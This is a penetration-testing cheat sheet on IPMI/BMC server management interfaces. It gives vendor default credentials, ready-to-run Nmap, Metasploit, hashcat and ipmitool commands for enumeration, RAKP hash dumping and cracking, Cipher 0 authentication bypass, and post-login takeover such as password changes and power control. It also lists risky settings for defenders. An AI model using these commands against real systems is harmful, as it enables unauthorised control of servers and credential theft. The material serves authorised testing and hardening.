#IPMI #IntelligentPlatformManagementInterface #networkmanagement

## What is IPMI?
Intelligent Platform Management Interface — standardized hardware-based host management system. Operates independently of the OS, BIOS, CPU, and firmware. Allows remote management even when the host is powered off or unresponsive.

- Port **UDP 623** — IPMI (RMCP/RMCP+)
- Clients called **Baseboard Management Controllers (BMC)** — typically embedded ARM chips running Linux, built into motherboards or available as add-on cards
- Provides physical-access-equivalent capability over the network
- Common implementations: HP iLO, Dell iDRAC, Supermicro IPMI

### Typical Use Cases
- Modify BIOS before OS boots
- Manage fully powered-down hosts
- Access host after system failure / crash

---

## Default Credentials

| Product | Username | Password |
|---|---|---|
| Dell iDRAC | `root` | `calvin` |
| HP iLO | `Administrator` | Random 8-char (numbers + uppercase) |
| Supermicro IPMI | `ADMIN` | `ADMIN` |
| IBM IMM | `USERID` | `PASSW0RD` |
| Cisco UCS | `admin` | `password` |

---

## Enumeration

```bash
# Nmap
nmap -sU -p 623 --script ipmi-version <target>
nmap -sU -p 623 <target>

# Metasploit — version and info
use auxiliary/scanner/ipmi/ipmi_version
set RHOSTS <target>
run
```

---

## RAKP Hash Disclosure

IPMI 2.0 RAKP (Remote Authenticated Key-Exchange Protocol) authentication flaw: the server sends a salted SHA1/MD5 hash of the user's password **before** verifying the client. This hash can be captured and cracked offline.

```bash
# Metasploit — dump IPMI hashes
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS <target>
set OUTPUT_JOHN_FILE ipmi_hashes.txt
run
```

### Crack IPMI Hash with hashcat

```bash
# Mode 7300 = IPMI2 RAKP HMAC-SHA1
hashcat -m 7300 ipmi_hashes.txt /usr/share/wordlists/rockyou.txt

# For HP iLO: default passwords are 8 chars, numbers + uppercase only
hashcat -m 7300 ipmi_hashes.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u

# With rules
hashcat -m 7300 ipmi_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

---

## Attack Vectors

### Default Credential Testing

```bash
# Metasploit brute force
use auxiliary/scanner/ipmi/ipmi_login
set RHOSTS <target>
set BLANK_PASSWORDS true
run
```

### Post-Authentication

Once authenticated to the BMC web interface or IPMI:
- Dump all user credentials (stored in BMC memory)
- Change existing user passwords
- Enable/disable remote management features
- Boot from attacker-controlled ISO
- Full OS control via remote KVM/console

```bash
# Once shell access obtained (via iDRAC/iLO), dump password hashes
# HP iLO: view firmware and user data
# Dell iDRAC: access virtual console, mount ISO images
```

### Cipher 0 Authentication Bypass (Legacy)

Some IPMI implementations accept **Cipher 0** which allows authentication with any password (authentication not enforced).

```bash
ipmitool -I lanplus -C 0 -H <target> -U <user> -P anypass chassis power status
ipmitool -I lanplus -C 0 -H <target> -U admin -P "" user list
```

---

## ipmitool

```bash
# Check chassis status
ipmitool -I lanplus -H <target> -U <user> -P <pass> chassis status

# List users
ipmitool -I lanplus -H <target> -U <user> -P <pass> user list

# Set user password
ipmitool -I lanplus -H <target> -U <user> -P <pass> user set password 2 newpassword

# Power control
ipmitool -I lanplus -H <target> -U <user> -P <pass> power on
ipmitool -I lanplus -H <target> -U <user> -P <pass> power off
ipmitool -I lanplus -H <target> -U <user> -P <pass> power reset

# Sensor readings
ipmitool -I lanplus -H <target> -U <user> -P <pass> sensor list

# SOL (Serial Over LAN) — console access
ipmitool -I lanplus -H <target> -U <user> -P <pass> sol activate
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| Default credentials unchanged | Full BMC control |
| IPMI exposed to internet | Remote attack without VPN |
| Cipher 0 enabled | Authentication bypass |
| RAKP enabled | Offline hash cracking |
| Admin access via BMC = OS root | Physical access equivalent |
| No network isolation for IPMI | Pivot from compromised host |

---

## Quick Reference

| Goal | Command |
|---|---|
| Nmap scan | `nmap -sU -p 623 --script ipmi-version host` |
| Dump hashes | MSF `auxiliary/scanner/ipmi/ipmi_dumphashes` |
| Crack hashes | `hashcat -m 7300 ipmi_hashes.txt rockyou.txt` |
| HP iLO mask | `hashcat -m 7300 hash.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u` |
| Cipher 0 bypass | `ipmitool -I lanplus -C 0 -H host -U admin -P "" user list` |
| List users | `ipmitool -I lanplus -H host -U user -P pass user list` |
